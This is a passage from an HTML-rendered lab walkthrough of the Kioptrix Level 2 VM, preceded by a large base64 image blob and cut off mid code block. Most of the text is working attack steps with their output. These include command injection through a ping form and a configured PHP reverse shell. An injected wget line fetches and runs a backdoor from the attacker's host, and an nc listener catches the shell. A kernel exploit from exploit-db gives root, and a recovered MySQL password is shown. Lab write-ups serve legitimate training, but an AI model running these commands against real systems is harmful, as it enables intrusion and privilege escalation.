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" alt="" /></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>192.168.1.10
+PING 192.168.1.10 <span class="o">(</span>192.168.1.10<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>0 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>55.5 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>3.62 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.08 ms
+
+<span class="nt">---</span> 192.168.1.10 ping statistics <span class="nt">---</span>
+3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2002ms
+rtt min/avg/max/mdev <span class="o">=</span> 1.087/20.070/55.501/25.074 ms, pipe 2
+</pre></table></code></div></div><p>A this functionality, there is possibility for command injection, try to execute command by providing within the ip address</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>ip_address<span class="p">;</span>commad
+</pre></table></code></div></div><p>For example</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>192.168.1.10<span class="p">;</span><span class="nb">ls</span> 
+</pre></table></code></div></div><p>And as expected it returns the filenames on current directory.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>192.168.1.10<span class="p">;</span><span class="nb">ls
+</span>PING 192.168.1.10 <span class="o">(</span>192.168.1.10<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>0 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>54.0 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>3.52 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.17 ms
+
+<span class="nt">---</span> 192.168.1.10 ping statistics <span class="nt">---</span>
+3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2001ms
+rtt min/avg/max/mdev <span class="o">=</span> 1.175/19.587/54.059/24.394 ms, pipe 2
+index.php
+pingit.php
+</pre></table></code></div></div><p>Another example :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>192.168.1.10<span class="p">;</span><span class="nb">ls</span> <span class="nt">-al</span><span class="p">;</span><span class="nb">pwd</span><span class="p">;</span><span class="nb">whoami
+</span>PING 192.168.1.10 <span class="o">(</span>192.168.1.10<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>0 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>57.1 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.18 ms
+64 bytes from 192.168.1.10: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.17 ms
+
+<span class="nt">---</span> 192.168.1.10 ping statistics <span class="nt">---</span>
+3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2001ms
+rtt min/avg/max/mdev <span class="o">=</span> 1.173/19.832/57.144/26.383 ms, pipe 2
+total 24
+drwxr-xr-x  2 root root 4096 Oct  8  2009 <span class="nb">.</span>
+drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
+<span class="nt">-rwxr-Sr-t</span>  1 root root 1733 Feb  9  2012 index.php
+<span class="nt">-rwxr-Sr-t</span>  1 root root  199 Oct  8  2009 pingit.php
+/var/www/html
+apache  
+</pre></table></code></div></div><p>The user is : apache, dirctory is /var/www/html, all the files are root privileged.</p><h3 id="getting-a-remote-shell">Getting a remote shell</h3><p>We are going to use php reverse shell from pentestmonkey.net : http://pentestmonkey.net/tools/web-shells/php-reverse-shell</p><p>Download it from there page and change the $ip and $port to your local system.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>set_time_limit <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'192.168.1.3'</span><span class="p">;</span>  // CHANGE THIS
+<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>       // CHANGE THIS
+<span class="nv">$chunk_size</span> <span class="o">=</span> 1400<span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> null<span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> null<span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> 0<span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> 0<span class="p">;</span>
+</pre></table></code></div></div><p>Now to upload this php file we use series of commands. First start a server to host the bd.php(i renamed the reverse shell php file) file. We can use a simple python server</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>python <span class="nt">-m</span> SimpleHTTPServer 8000  
+</pre></table></code></div></div><p>Commands to upload file</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nb">cd</span> /tmp                               <span class="c"># change dirctory to tmp</span>
+wget http://192.168.1.3:8000/bd.php   <span class="c"># downlaod backdoor file</span>
+php <span class="nt">-f</span> bd.php                         <span class="c"># execute file</span>
+</pre></table></code></div></div><p>Remember we cant download file on webroot directory, because it is root privileged, and the ping command is executed by user apache. Before execute the commands first start the listener on local machine</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvvp</span> 1234
+Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 1234<span class="o">)</span>
+</pre></table></code></div></div><p>Command :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>192.168.1.10<span class="p">;</span><span class="nb">cd</span> /tmp/wget http://192.168.1.3:8000/bd.php<span class="p">;</span>php <span class="nt">-f</span> bd.php  
+</pre></table></code></div></div><p>After the execution we can get a reverse shell on listener</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvvp</span> 1234
+Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 1234<span class="o">)</span>
+Connection from 192.168.1.4 45265 received!
+Linux kioptrix.level2 2.6.9-55.EL <span class="c">#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span>
+ 12:21:07 up  6:17,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+sh: no job control <span class="k">in </span>this shell
+sh-3.00<span class="err">$</span>
+sh-3.00<span class="nv">$ </span><span class="nb">whoami
+</span>apache  
+</pre></table></code></div></div><p>And we can get the reverse shell.</p><h3 id="kernel-privilege-escalation">Kernel Privilege Escalation</h3><p>Examining the OS and Kernel version</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>sh-3.00# <span class="nb">uname</span> <span class="nt">-a</span>
+Linux kioptrix.level2 2.6.9-55.EL <span class="c">#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span>
+sh-3.00# <span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
+CentOS release 4.5 <span class="o">(</span>Final<span class="o">)</span>
+</pre></table></code></div></div><p>A google search for kernel 2.6 exploit” give the exploit for kernel 2.6.22 less then is found from here : https://www.exploit-db.com/exploits/9542</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget https://www.exploit-db.com/raw/9542
+<span class="nv">$ </span><span class="nb">mv </span>9542 peroot.c 
+</pre></table></code></div></div><p>Now downloading it into the Kioptrix</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>sh-3.00<span class="nv">$ </span><span class="nb">cd</span> /tmp
+sh-3.00<span class="nv">$ </span>wget http://192.168.1.3:8000/peroot.c
+sh-3.00<span class="nv">$ </span>gcc peroot.c <span class="nt">-o</span> peroot
+dirty.c:109:28: warning: no newline at end of file
+sh-3.00<span class="nv">$ </span>./peroot
+sh-3.00# <span class="nb">whoami
+</span>root
+</pre></table></code></div></div><p>It gives the root access.</p><h3 id="examining-files">Examining Files</h3><p>By examine php files from webroot directory we find the user ‘john’ and its password ‘hiroshima’ on mysql_connect() function.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
